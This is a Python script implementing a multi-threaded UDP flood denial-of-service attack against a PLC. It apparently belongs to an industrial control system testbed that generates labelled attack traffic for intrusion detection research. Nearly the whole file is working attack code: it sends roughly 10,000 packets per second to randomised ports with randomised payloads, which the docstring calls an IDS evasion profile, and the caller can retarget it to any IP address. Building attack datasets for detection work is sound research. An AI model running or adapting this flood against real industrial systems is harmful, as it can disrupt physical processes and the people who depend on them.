"""
Attack #2: UDP Flood (Denial of Service)
==================================================================
The heaviest-volume flood attack. Saturates network bandwidth entirely.
Effect: the PLC's UDP stack backs up, causing Modbus TCP packets to be dropped.

Packet rate targets:
  - Strong UDP flood: 5,000-20,000+ pkt/s
  - Parallel sending across multiple threads
  - Randomized ports and payload (IDS evasion profile)

MITRE ATT&CK for ICS: T0814 - Denial of Service
Zeek signature: conn.log -> proto=udp, orig_pkts, orig_bytes, duration
"""

import time
import sys
import os
import socket
import random
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from network_attacks.net_config import (
    PLC_IP, MODBUS_PORT, DEFAULT_NET_DURATION,
    LABEL_UDP_FLOOD, NET_DURATIONS
)

ATTACK_NAME  = "UDP_Flood"
ATTACK_ID    = LABEL_UDP_FLOOD

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
# Target: ~10,000 pkt/s (5 threads x 2000 pkt/s)
THREAD_COUNT = 5
BATCH_SIZE   = 100      # Per-thread batch size
BATCH_SLEEP  = 0.05     # 100 / 0.05 = 2000 pkt/s per thread -> ~10000 total
TARGET_PORTS = [7, 9, 17, 19, 53, 67, 68, 69, 123, 161, 162, 514, 520, 1900]
# Different payload sizes: realistic distribution
PAYLOAD_SIZES = [64, 128, 256, 338, 512, 1024, 1400]


def _flood_worker(target_ip: str, duration_sec: float,
                  counter: list, error_counter: list,
                  stop_event: threading.Event):
    """UDP flood thread worker."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start = time.time()

    while not stop_event.is_set() and (time.time() - start) < duration_sec:
        # New payload each batch (realistic behavior)
        payload_size = random.choice(PAYLOAD_SIZES)
        payload = random.randbytes(payload_size)

        for _ in range(BATCH_SIZE):
            if stop_event.is_set():
                break
            try:
                port = random.choice(TARGET_PORTS)
                sock.sendto(payload, (target_ip, port))
                counter[0] += 1
            except Exception:
                error_counter[0] += 1
                try:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                except Exception:
                    pass

        time.sleep(BATCH_SLEEP)

    try:
        sock.close()
    except Exception:
        pass


def run_attack(duration_sec=None, label_manager=None, target_ip=None):
    """Multi-threaded UDP flood."""
    if duration_sec is None:
        duration_sec = NET_DURATIONS.get("udp_flood", DEFAULT_NET_DURATION)
    if target_ip is None:
        target_ip = PLC_IP

    est_pps = THREAD_COUNT * (BATCH_SIZE / BATCH_SLEEP)

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target   : {target_ip} ({len(TARGET_PORTS)} UDP ports)")
    print(f"  Threads  : {THREAD_COUNT} x {BATCH_SIZE}/{BATCH_SLEEP}s = ~{est_pps:.0f} pkt/s")
    print(f"  Payload  : variable {PAYLOAD_SIZES[0]}-{PAYLOAD_SIZES[-1]} bytes")
    print(f"  Duration : {duration_sec}s")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"UDP flood -> {target_ip}, ~{est_pps:.0f} pkt/s, {THREAD_COUNT} threads"
        )

    counter       = [0]
    error_counter = [0]
    stop_event    = threading.Event()
    threads       = []

    for _ in range(THREAD_COUNT):
        t = threading.Thread(
            target=_flood_worker,
            args=(target_ip, duration_sec, counter, error_counter, stop_event),
            daemon=True
        )
        t.start()
        threads.append(t)

    start_time = time.time()
    try:
        while (time.time() - start_time) < duration_sec:
            elapsed = time.time() - start_time
            rem     = duration_sec - elapsed
            pps     = counter[0] / max(elapsed, 0.1)
            print(f"  [UDP]  {counter[0]:,} pkt | {pps:.0f} pkt/s | remaining: {rem:.0f}s")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n  [UDP] Manual stop!")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        pps     = counter[0] / max(elapsed, 0.1)
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{counter[0]:,} packets, {error_counter[0]} errors, {elapsed:.1f}s, {pps:.0f} pkt/s"
            )
        print(f"\n  [UDP] {counter[0]:,} packets | {pps:.0f} pkt/s | {elapsed:.1f}s")
    return True


if __name__ == "__main__":
    run_attack(duration_sec=30)
